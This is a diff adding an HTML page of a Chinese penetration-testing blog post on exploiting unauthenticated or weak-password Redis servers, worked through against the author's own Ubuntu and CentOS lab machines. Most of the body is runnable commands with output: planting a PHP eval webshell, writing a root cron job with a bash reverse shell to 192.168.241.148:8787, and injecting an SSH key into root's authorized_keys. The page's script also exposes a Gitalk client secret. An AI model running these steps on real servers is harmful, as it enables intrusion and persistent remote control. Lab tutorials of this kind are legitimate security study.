@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    redis利用方式 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-redis利用方式" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      redis利用方式
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" class="article-date">
+  <time datetime="2023-06-06T01:45:57.000Z" itemprop="datePublished">2023-06-06</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>redis数据库在渗透中的利用方式总结</p>
+<a id="more"></a>
+
+<h1 id="Redis利用"><a href="#Redis利用" class="headerlink" title="Redis利用"></a>Redis利用</h1><h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01 环境配置"></a>0x01 环境配置</h2><p>由于在ubuntu环境下无法成功通过写定时任务进行成功利用，分别部署了ubuntu20.04和centos7环境。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu20.04 192.168.241.149</span><br><span class="line">centos 		192.168.241.150</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ubuntu apt安装</li>
+</ul>
+<p>运行如下命令直接安装redis-server</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure>
+
+<p>默认配置文件位置在/etc/redis/redis.conf</p>
+<ul>
+<li>centos yum安装</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install redis</span><br><span class="line">iptables -I INPUT -p tcp --dport 6379 -j ACCEPT #开启6379端口防火墙</span><br></pre></td></tr></table></figure>
+
+<p>默认配置文件位置在/etc/redis.conf</p>
+<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><p>分成未授权访问和弱口令或口令泄露两种场景</p>
+<h3 id="2-1-未授权访问"><a href="#2-1-未授权访问" class="headerlink" title="2.1 未授权访问"></a>2.1 未授权访问</h3><h4 id="2-1-1-redis-配置"><a href="#2-1-1-redis-配置" class="headerlink" title="2.1.1 redis 配置"></a>2.1.1 redis 配置</h4><p>修改配置文件/etc/redis/redis.conf，在bind后面加上主机外网的IP（这里以局域网192.168.241.149为例），设置称不需要密码访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">bind 127.0.0.1 192.168.241.149</span><br><span class="line">......</span><br><span class="line"># requirepass foobared</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>kill掉redis-server进程，重启redis服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep redis</span><br><span class="line">kill -9 &lt;pid&gt;</span><br><span class="line">redis-server  /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1-2-利用方式"><a href="#2-1-2-利用方式" class="headerlink" title="2.1.2 利用方式"></a>2.1.2 利用方式</h4><p>fscan扫描结果</p>
+<blockquote>
+<p>ubuntu20.04 192.168.241.149</p>
+</blockquote>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605081241370.png" alt="image-20230605081241370"></p>
+<blockquote>
+<p>centos7 192.168.241.150</p>
+</blockquote>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605172259777.png" alt="image-20230605172259777"></p>
+<h5 id="（1）写webshell"><a href="#（1）写webshell" class="headerlink" title="（1）写webshell"></a>（1）写webshell</h5><blockquote>
+<p>ubuntu 20.04</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>目标开启web服务</li>
+<li>web服务根目录有写权限</li>
+</ul>
+<p>步骤：</p>
+<ol>
+<li><p>目标80端口开放web服务</p>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230604222106825.png" alt="image-20230604222106825"></p>
+</li>
+<li><p>利用未授权向/var/www/html/目录写webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.241.149		连接192.168.241.149上的redis服务</span><br><span class="line">config set dir /var/www/html		设置保存的目录</span><br><span class="line">config set dbfilename test.php 		设置保存的文件名</span><br><span class="line">set x "&lt;?php @eval($_POST[123]);?&gt;"	设置保存的内容</span><br><span class="line">save								保存</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.241.149</span></span><br><span class="line">192.168.241.149:6379&gt; config set dir /var/www/html</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt; config set dbfilename test.php</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt; set x "&lt;?php @eval($_POST[123]);?&gt;"</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605082015731.png" alt="image-20230605082015731"></p>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605081936283.png" alt="image-20230605081936283"></p>
+</li>
+</ol>
+<blockquote>
+<p>centos7</p>
+</blockquote>
+<p>步骤：</p>
+<ol>
+<li><p>目标80端口开放web服务</p>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605170217106.png" alt="image-20230605170217106"></p>
+</li>
+<li><p>利用未授权向/var/www/html/目录写webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.241.150		连接192.168.241.150上的redis服务</span><br><span class="line">config set dir /var/www/html		设置保存的目录</span><br><span class="line">config set dbfilename test.php 		设置保存的文件名</span><br><span class="line">set x "&lt;?php @eval($_POST[123]);?&gt;"	设置保存的内容</span><br><span class="line">save								保存</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.241.150</span></span><br><span class="line">192.168.241.150:6379&gt; config set dir /var/www/html</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; config set dbfilename test.php</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; set x "&lt;?php @eval($_POST[123]);?&gt;"</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605170653059.png" alt="image-20230605170653059"></p>
+</li>
+</ol>
+<h5 id="（2）写定时任务"><a href="#（2）写定时任务" class="headerlink" title="（2）写定时任务"></a>（2）写定时任务</h5><blockquote>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605085319805.png" alt="image-20230605085319805"></p>
+<p><a href="https://blog.csdn.net/q20010619/article/details/121912003" target="_blank" rel="noopener">https://blog.csdn.net/q20010619/article/details/121912003</a></p>
+</blockquote>
+<blockquote>
+<p>centos</p>
+</blockquote>
+<p>条件：</p>
+<ul>
+<li>定时任务目录有写权限</li>
+</ul>
+<p>步骤</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.241.150	连接192.168.241.150上的redis服务</span><br><span class="line">config set dir /var/spool/cron	设置保存的目录</span><br><span class="line">config set dbfilename root 		设置保存的文件名</span><br><span class="line">set x "\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.241.148/8787 0&gt;&amp;1\n\n"	设置保存的内容</span><br><span class="line">save							保存</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.241.150</span></span><br><span class="line">192.168.241.150:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; set x "\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.241.148/8787 0&gt;&amp;1\n\n"</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605171348532.png" alt="image-20230605171348532"></p>
+<h5 id="（3）写公钥"><a href="#（3）写公钥" class="headerlink" title="（3）写公钥"></a>（3）写公钥</h5><p>条件：</p>
+<ul>
+<li>知道启动服务的用户</li>
+<li>拥有.ssh目录</li>
+<li>允许使用基于密钥认证的方式登录</li>
+</ul>
+<blockquote>
+<p>ubuntu20.04</p>
+</blockquote>
+<p>步骤</p>
+<ol>
+<li><p>在攻击机本地生成一对ssh key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将生成的公钥值写入目标服务器的authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; &#x2F;tmp&#x2F;foo.txt</span><br><span class="line">cat &#x2F;tmp&#x2F;foo.txt | redis-cli -h 192.168.241.149 -p 6379 -x set crackit</span><br><span class="line"></span><br><span class="line">redis-cli -h 192.168.241.149			连接192.168.241.149上的redis服务</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;				设置保存的目录</span><br><span class="line">config set dbfilename authorized_keys 	设置保存的文件名</span><br><span class="line">save									保存</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; /tmp/foo.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/foo.txt | redis-cli -h 192.168.241.149 -p 6379 -x <span class="built_in">set</span> crackit</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.241.149</span></span><br><span class="line">192.168.241.149:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.241.149:6379&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605102736980.png" alt="image-20230605102736980"></p>
+</li>
+<li><p>root免密登录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.241.149</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605102947073.png" alt="image-20230605102947073"></p>
+<blockquote>
+<p>centos</p>
+</blockquote>
+<p>PS:centos开始没有/root/.ssh/目录，运行ssh localhost后生成/root/.ssh/目录，<a href="https://www.cnblogs.com/guns/p/13895978.html" target="_blank" rel="noopener">参考</a>。</p>
+<ol>
+<li><p>在攻击机本地生成一对ssh key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将生成的公钥值写入目标服务器的authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; &#x2F;tmp&#x2F;foo.txt</span><br><span class="line">cat &#x2F;tmp&#x2F;foo.txt | redis-cli -h 192.168.241.150 -p 6379 -x set crackit</span><br><span class="line"></span><br><span class="line">redis-cli -h 192.168.241.150			连接192.168.241.150上的redis服务</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;				设置保存的目录</span><br><span class="line">config set dbfilename authorized_keys 	设置保存的文件名</span><br><span class="line">save									保存</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; /tmp/foo.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/foo.txt | redis-cli -h 192.168.241.150 -p 6379 -x <span class="built_in">set</span> ccc</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 192.168.241.150</span></span><br><span class="line">192.168.241.150:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.241.150:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605172113600.png" alt="image-20230605172113600"></p>
+</li>
+<li><p>ssh免密登录</p>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605172206887.png" alt="image-20230605172206887"></p>
+</li>
+</ol>
+</li>
+</ol>
+<h5 id="（4）主从复制"><a href="#（4）主从复制" class="headerlink" title="（4）主从复制"></a>（4）主从复制</h5><p>原理大概是通过设置攻击者控制VPS为主redis机，被攻击者为备份redis机，从主redis复制恶意.so模块，加载恶意模块，执行系统命令。</p>
+<blockquote>
+<p>ubuntu20.04</p>
+</blockquote>
+<p>步骤</p>
+<ol>
+<li></li>
+</ol>
+<h3 id="2-2-弱口令或者口令泄露"><a href="#2-2-弱口令或者口令泄露" class="headerlink" title="2.2 弱口令或者口令泄露"></a>2.2 弱口令或者口令泄露</h3><h4 id="2-2-1-redis配置"><a href="#2-2-1-redis配置" class="headerlink" title="2.2.1 redis配置"></a>2.2.1 redis配置</h4><p>修改redis配置文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">requirepsss root</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>kill掉redis-server进程，重启redis服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep redis</span><br><span class="line">kill -9 &lt;pid&gt;</span><br><span class="line">redis-server  /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-2-利用方式"><a href="#2-2-2-利用方式" class="headerlink" title="2.2.2 利用方式"></a>2.2.2 利用方式</h4><p>fscan扫描结果</p>
+<blockquote>
+<p>ubuntu 20.04</p>
+</blockquote>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605174206285.png" alt="image-20230605174206285"></p>
+<blockquote>
+<p>centos7</p>
+</blockquote>
+<p><img src="/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20230605174310033.png" alt="image-20230605174310033"></p>
+<p>PS:</p>
+<p>同上，只需在 redis-cli -h 192.168.241.150 后面加上-a &lt;password&gt;</p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2023/06/06/redis利用方式/" target="_blank" title="redis利用方式">http://mount4in.github.io/2023/06/06/redis利用方式/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2023/06/06/redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" data-id="clijmhp620002qwuvg5f1dpef"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2023/04/13/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Understanding-and-Mitigating-Remote-Code-Execution-Vulnerabilities-in-Cross-platform-Ecosystem/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">论文笔记--Understanding and Mitigating Remote Code Execution Vulnerabilities in Cross-platform Ecosystem</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
